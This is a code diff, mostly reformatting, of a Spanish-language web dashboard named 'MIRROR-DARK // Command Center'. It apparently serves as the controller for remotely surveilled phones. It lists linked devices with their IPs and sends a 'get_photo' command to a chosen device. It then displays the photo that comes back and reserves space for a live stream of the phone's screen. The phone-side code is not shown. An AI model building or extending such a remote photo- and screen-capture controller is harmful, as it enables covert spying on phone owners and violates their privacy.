@@ -1,200 +1,246 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>MIRROR-DARK // Command Center</title>
     <!-- Tailwind CSS para diseño moderno -->
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body {
-            background-color: #050811;
-            color: #C0D0E0;
-            font-family: 'Courier New', Courier, monospace;
-        }
-        .neon-border {
-            border: 1px solid #00E5FF;
-            box-shadow: 0 0 10px rgba(0, 229, 255, 0.2);
-        }
-        .neon-glow-green {
-            box-shadow: 0 0 8px rgba(0, 255, 102, 0.4);
-        }
-        .neon-glow-red {
-            box-shadow: 0 0 8px rgba(255, 82, 82, 0.4);
-        }
-        /* Scrollbar personalizado estilo consola */
-        ::-webkit-scrollbar {
-            width: 6px;
-        }
-        ::-webkit-scrollbar-track {
-            background: #0A0F1D;
-        }
-        ::-webkit-scrollbar-thumb {
-            background: #00E5FF;
-            border-radius: 3px;
-        }
+      body {
+        background-color: #050811;
+        color: #c0d0e0;
+        font-family: "Courier New", Courier, monospace;
+      }
+      .neon-border {
+        border: 1px solid #00e5ff;
+        box-shadow: 0 0 10px rgba(0, 229, 255, 0.2);
+      }
+      .neon-glow-green {
+        box-shadow: 0 0 8px rgba(0, 255, 102, 0.4);
+      }
+      .neon-glow-red {
+        box-shadow: 0 0 8px rgba(255, 82, 82, 0.4);
+      }
+      /* Scrollbar personalizado estilo consola */
+      ::-webkit-scrollbar {
+        width: 6px;
+      }
+      ::-webkit-scrollbar-track {
+        background: #0a0f1d;
+      }
+      ::-webkit-scrollbar-thumb {
+        background: #00e5ff;
+        border-radius: 3px;
+      }
     </style>
-</head>
-<body class="p-4 md:p-6 min-h-screen flex flex-col justify-between">
-
+  </head>
+  <body class="p-4 md:p-6 min-h-screen flex flex-col justify-between">
     <!-- HEADER DE COMANDO -->
-    <header class="neon-border bg-[#0A0F1D] p-4 rounded-lg mb-6 flex flex-col md:flex-row justify-between items-center">
-        <div class="flex items-center space-x-3 mb-2 md:mb-0">
-            <div class="w-3 h-3 bg-[#00E5FF] rounded-full animate-ping"></div>
-            <h1 class="text-lg md:text-xl font-bold tracking-widest text-[#00E5FF]">MIRROR-DARK // COMMAND CENTER</h1>
-        </div>
-        <div class="flex items-center space-x-4 text-xs">
-            <span class="text-gray-400">ESTADO DEL MOTOR: <span id="engineStatus" class="font-bold text-yellow-400">CONECTANDO...</span></span>
-            <span id="clock" class="text-[#00FF66] font-mono">00:00:00</span>
-        </div>
+    <header
+      class="neon-border bg-[#0A0F1D] p-4 rounded-lg mb-6 flex flex-col md:flex-row justify-between items-center"
+    >
+      <div class="flex items-center space-x-3 mb-2 md:mb-0">
+        <div class="w-3 h-3 bg-[#00E5FF] rounded-full animate-ping"></div>
+        <h1 class="text-lg md:text-xl font-bold tracking-widest text-[#00E5FF]">
+          MIRROR-DARK // COMMAND CENTER
+        </h1>
+      </div>
+      <div class="flex items-center space-x-4 text-xs">
+        <span class="text-gray-400"
+          >ESTADO DEL MOTOR:
+          <span id="engineStatus" class="font-bold text-yellow-400"
+            >CONECTANDO...</span
+          ></span
+        >
+        <span id="clock" class="text-[#00FF66] font-mono">00:00:00</span>
+      </div>
     </header>
 
     <!-- CONTENEDOR PRINCIPAL -->
     <main class="grid grid-cols-1 lg:grid-cols-3 gap-6 flex-grow mb-6">
+      <!-- COLUMNA 1 & 2: DISPOSITIVOS TÁCTICOS CONECTADOS -->
+      <section
+        class="lg:col-span-2 neon-border bg-[#0A0F1D]/80 p-4 rounded-lg flex flex-col"
+      >
+        <div
+          class="flex justify-between items-center mb-4 border-b border-[#00E5FF]/30 pb-2"
+        >
+          <h2 class="text-sm font-bold text-[#00E5FF] tracking-wider">
+            > NODOS MÓVILES ENLAZADOS
+          </h2>
+          <span
+            id="deviceCount"
+            class="text-xs bg-[#00E5FF]/20 text-[#00E5FF] px-2 py-1 rounded"
+            >0 ACTIVOS</span
+          >
+        </div>
 
-      
-        
-        <!-- COLUMNA 1 & 2: DISPOSITIVOS TÁCTICOS CONECTADOS -->
-        <section class="lg:col-span-2 neon-border bg-[#0A0F1D]/80 p-4 rounded-lg flex flex-col">
-            <div class="flex justify-between items-center mb-4 border-b border-[#00E5FF]/30 pb-2">
-                <h2 class="text-sm font-bold text-[#00E5FF] tracking-wider">> NODOS MÓVILES ENLAZADOS</h2>
-                <span id="deviceCount" class="text-xs bg-[#00E5FF]/20 text-[#00E5FF] px-2 py-1 rounded">0 ACTIVOS</span>
-            </div>
+        <!-- Lista de Dispositivos -->
+        <div
+          id="devicesContainer"
+          class="space-y-3 overflow-y-auto max-h-[400px] flex-grow pr-1"
+        >
+          <!-- Estado vacío por defecto -->
+          <div
+            class="text-center py-12 text-gray-500 text-sm border border-dashed border-gray-800 rounded"
+          >
+            [ ESCANEANDO RED EN BUSCA DE DISPOSITIVOS... ]
+          </div>
+        </div>
+      </section>
 
-            <!-- Lista de Dispositivos -->
-            <div id="devicesContainer" class="space-y-3 overflow-y-auto max-h-[400px] flex-grow pr-1">
-                <!-- Estado vacío por defecto -->
-                <div class="text-center py-12 text-gray-500 text-sm border border-dashed border-gray-800 rounded">
-                    [ ESCANEANDO RED EN BUSCA DE DISPOSITIVOS... ]
-                </div>
-            </div>
-        </section>
+      <!-- Agrega esto en tu sección de visualización del index.html -->
+      <div
+        class="relative w-full h-[500px] bg-black border border-[#00E5FF]/40 rounded flex items-center justify-center overflow-hidden mb-4"
+      >
+        <img
+          id="screenStream"
+          alt="Transmisión en vivo..."
+          class="object-contain w-full h-full hidden"
+        />
+        <span id="screenPlaceholder" class="text-xs text-gray-500 text-center"
+          >[ ESPERANDO TRANSMISIÓN DE PANTALLA... ]</span
+        >
+      </div>
 
+  
+      <!-- COLUMNA 3: VISOR DE CAPTURAS Y TELEMETRÍA -->
+      <section
+        class="neon-border bg-[#0A0F1D]/80 p-4 rounded-lg flex flex-col justify-between"
+      >
+        <div>
+          <h2
+            class="text-sm font-bold text-[#00E5FF] tracking-wider border-b border-[#00E5FF]/30 pb-2 mb-4"
+          >
+            > VISOR TÁCTICO // CAPTURAS
+          </h2>
 
-        <!-- Agrega esto en tu sección de visualización del index.html -->
-<div class="relative w-full h-[500px] bg-black border border-[#00E5FF]/40 rounded flex items-center justify-center overflow-hidden mb-4">
-    <img id="screenStream" alt="Transmisión en vivo..." class="object-contain w-full h-full hidden">
-    <span id="screenPlaceholder" class="text-xs text-gray-500 text-center">[ ESPERANDO TRANSMISIÓN DE PANTALLA... ]</span>
-</div>
+          <!-- Visor de Imagen -->
+          <div
+            class="relative w-full h-64 bg-black border border-[#00E5FF]/40 rounded flex items-center justify-center overflow-hidden mb-4"
+          >
+            <img
+              id="targetPhoto"
+              src=""
+              alt="Esperando captura..."
+              class="object-contain w-full h-full hidden"
+            />
+            <span
+              id="photoPlaceholder"
+              class="text-xs text-gray-600 text-center px-4"
+              >[ SIN TRANSMISIÓN DE IMAGEN ACTIVA ]</span
+            >
+          </div>
+        </div>
 
-<script>
-    const screenStream = document.getElementById('screenStream');
-    const screenPlaceholder = document.getElementById('screenPlaceholder');
-
-    // Recibir fotogramas de la pantalla del celular en tiempo real
-    socket.on('screen_frame', (base64Frame) => {
-        screenStream.src = `data:image/jpeg;base64,${base64Frame}`;
-        screenStream.classList.remove('hidden');
-        screenPlaceholder.classList.add('hidden');
-    });
-</script>
-
-        <!-- COLUMNA 3: VISOR DE CAPTURAS Y TELEMETRÍA -->
-        <section class="neon-border bg-[#0A0F1D]/80 p-4 rounded-lg flex flex-col justify-between">
-            <div>
-                <h2 class="text-sm font-bold text-[#00E5FF] tracking-wider border-b border-[#00E5FF]/30 pb-2 mb-4">> VISOR TÁCTICO // CAPTURAS</h2>
-                
-                <!-- Visor de Imagen -->
-                <div class="relative w-full h-64 bg-black border border-[#00E5FF]/40 rounded flex items-center justify-center overflow-hidden mb-4">
-                    <img id="targetPhoto" src="" alt="Esperando captura..." class="object-contain w-full h-full hidden">
-                    <span id="photoPlaceholder" class="text-xs text-gray-600 text-center px-4">[ SIN TRANSMISIÓN DE IMAGEN ACTIVA ]</span>
-                </div>
-            </div>
-
-            <!-- Consola de Logs del Sistema -->
-            <div>
-                <h3 class="text-xs font-bold text-gray-400 mb-2">> LOGS DE ACTIVIDAD</h3>
-                <div id="logConsole" class="bg-black/80 border border-gray-800 rounded p-2 h-32 overflow-y-auto text-[10px] text-green-400 font-mono">
-                    [System] Inicializando interfaz web de comando...<br>
-                    [Socket] Esperando enlace con servidor Node.js...
-                </div>
-            </div>
-        </section>
+        <!-- Consola de Logs del Sistema -->
+        <div>
+          <h3 class="text-xs font-bold text-gray-400 mb-2">
+            > LOGS DE ACTIVIDAD
+          </h3>
+          <div
+            id="logConsole"
+            class="bg-black/80 border border-gray-800 rounded p-2 h-32 overflow-y-auto text-[10px] text-green-400 font-mono"
+          >
+            [System] Inicializando interfaz web de comando...<br />
+            [Socket] Esperando enlace con servidor Node.js...
+          </div>
+        </div>
+      </section>
     </main>
 
     <!-- FOOTER -->
-    <footer class="text-center text-[10px] text-gray-600 tracking-widest border-t border-gray-900 pt-2">
-        SECURE SURVEILLANCE NODE SYSTEM V2.6 // AUTHORIZED ACCESS ONLY
+    <footer
+      class="text-center text-[10px] text-gray-600 tracking-widest border-t border-gray-900 pt-2"
+    >
+      SECURE SURVEILLANCE NODE SYSTEM V2.6 // AUTHORIZED ACCESS ONLY
     </footer>
 
     <!-- SCRIPT DE SOCKET.IO Y LÓGICA DEL PANEL -->
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        const socket = io();
+      const socket = io();
 
-        const engineStatus = document.getElementById('engineStatus');
-        const devicesContainer = document.getElementById('devicesContainer');
-        const deviceCount = document.getElementById('deviceCount');
-        const targetPhoto = document.getElementById('targetPhoto');
-        const photoPlaceholder = document.getElementById('photoPlaceholder');
-        const logConsole = document.getElementById('logConsole');
+      const engineStatus = document.getElementById("engineStatus");
+      const devicesContainer = document.getElementById("devicesContainer");
+      const deviceCount = document.getElementById("deviceCount");
+      const targetPhoto = document.getElementById("targetPhoto");
+      const photoPlaceholder = document.getElementById("photoPlaceholder");
+      const logConsole = document.getElementById("logConsole");
 
-        // Reloj en tiempo real estilo futurista
-        setInterval(() => {
-            const now = new Date();
-            document.getElementById('clock').innerText = now.toTimeString().split(' ')[0];
-        }, 1000);
+      // Reloj en tiempo real estilo futurista
+      setInterval(() => {
+        const now = new Date();
+        document.getElementById("clock").innerText = now
+          .toTimeString()
+          .split(" ")[0];
+      }, 1000);
 
-        function log(msg) {
-            logConsole.innerHTML += `> ${msg}<br>`;
-            logConsole.scrollTop = logConsole.scrollHeight;
+      function log(msg) {
+        logConsole.innerHTML += `> ${msg}<br>`;
+        logConsole.scrollTop = logConsole.scrollHeight;
+      }
+
+      // Eventos de conexión Socket.io
+      socket.on("connect", () => {
+        engineStatus.innerText = "ONLINE [CONECTADO]";
+        engineStatus.className = "font-bold text-[#00FF66]";
+        log("Conectado exitosamente al servidor Node.js.");
+      });
+
+      socket.on("disconnect", () => {
+        engineStatus.innerText = "OFFLINE [DESCONECTADO]";
+        engineStatus.className = "font-bold text-red-500";
+        log("¡Se perdió la conexión con el servidor!");
+      });
+
+      // Escuchar lista actualizada de dispositivos desde el servidor
+      // (Nota: Asegúrate de que tu backend emita 'update_devices' o maneje los registros de los teléfonos)
+      socket.on("update_devices", (devices) => {
+        devicesContainer.innerHTML = "";
+        deviceCount.innerText = `${devices.length} ACTIVOS`;
+
+        if (devices.length === 0) {
+          devicesContainer.innerHTML = `<div class="text-center py-12 text-gray-500 text-sm border border-dashed border-gray-800 rounded">[ NO HAY NODO MÓVIL REGISTRADO ]</div>`;
+          return;
         }
 
-        // Eventos de conexión Socket.io
-        socket.on('connect', () => {
-            engineStatus.innerText = 'ONLINE [CONECTADO]';
-            engineStatus.className = 'font-bold text-[#00FF66]';
-            log('Conectado exitosamente al servidor Node.js.');
-        });
-
-        socket.on('disconnect', () => {
-            engineStatus.innerText = 'OFFLINE [DESCONECTADO]';
-            engineStatus.className = 'font-bold text-red-500';
-            log('¡Se perdió la conexión con el servidor!');
-        });
-
-        // Escuchar lista actualizada de dispositivos desde el servidor
-        // (Nota: Asegúrate de que tu backend emita 'update_devices' o maneje los registros de los teléfonos)
-        socket.on('update_devices', (devices) => {
-            devicesContainer.innerHTML = '';
-            deviceCount.innerText = `${devices.length} ACTIVOS`;
-
-            if (devices.length === 0) {
-                devicesContainer.innerHTML = `<div class="text-center py-12 text-gray-500 text-sm border border-dashed border-gray-800 rounded">[ NO HAY NODO MÓVIL REGISTRADO ]</div>`;
-                return;
-            }
-
-            devices.forEach((dev, index) => {
-                const card = document.createElement('div');
-                card.className = "bg-[#111B2B] border border-[#00E5FF]/30 p-3 rounded flex flex-col md:flex-row justify-between items-center space-y-2 md:space-y-0";
-                card.innerHTML = `
+        devices.forEach((dev, index) => {
+          const card = document.createElement("div");
+          card.className =
+            "bg-[#111B2B] border border-[#00E5FF]/30 p-3 rounded flex flex-col md:flex-row justify-between items-center space-y-2 md:space-y-0";
+          card.innerHTML = `
                     <div>
-                        <div class="text-xs font-bold text-[#00E5FF]">${dev.name || 'Dispositivo Desconocido'}</div>
-                        <div class="text-[10px] text-gray-400">IP: <span class="text-green-400">${dev.ip || 'Desconocida'}</span> | ID: ${dev.id}</div>
+                        <div class="text-xs font-bold text-[#00E5FF]">${dev.name || "Dispositivo Desconocido"}</div>
+                        <div class="text-[10px] text-gray-400">IP: <span class="text-green-400">${dev.ip || "Desconocida"}</span> | ID: ${dev.id}</div>
                     </div>
                     <button onclick="triggerPhoto('${dev.id}')" class="bg-[#00E5FF] text-black text-xs font-bold px-3 py-1.5 rounded hover:bg-[#00b3cc] transition neon-glow-green">
                         [ CAPTURAR FOTO ]
                     </button>
                 `;
-                devicesContainer.appendChild(card);
-            });
+          devicesContainer.appendChild(card);
         });
+      });
 
-        // Función para ordenar al servidor que le pida la foto a un dispositivo específico por su ID socket
-        function triggerPhoto(socketId) {
-            log(`Enviando comando 'get_photo' al nodo: ${socketId}`);
-            socket.emit('send_command_to_device', { targetId: socketId, action: 'get_photo' });
+      // Función para ordenar al servidor que le pida la foto a un dispositivo específico por su ID socket
+      function triggerPhoto(socketId) {
+        log(`Enviando comando 'get_photo' al nodo: ${socketId}`);
+        socket.emit("send_command_to_device", {
+          targetId: socketId,
+          action: "get_photo",
+        });
+      }
+
+      // Recibir respuesta de foto del teléfono
+      socket.on("phone_response", (data) => {
+        if (data.type === "photo" && data.image) {
+          log("¡Fotografía recibida del dispositivo móvil!");
+          targetPhoto.src = `data:image/jpeg;base64,${data.image}`;
+          targetPhoto.classList.remove("hidden");
+          photoPlaceholder.classList.add("hidden");
         }
-
-        // Recibir respuesta de foto del teléfono
-        socket.on('phone_response', (data) => {
-            if (data.type === 'photo' && data.image) {
-                log('¡Fotografía recibida del dispositivo móvil!');
-                targetPhoto.src = `data:image/jpeg;base64,${data.image}`;
-                targetPhoto.classList.remove('hidden');
-                photoPlaceholder.classList.add('hidden');
-            }
-        });
+      });
     </script>
-</body>
+  </body>
 </html>
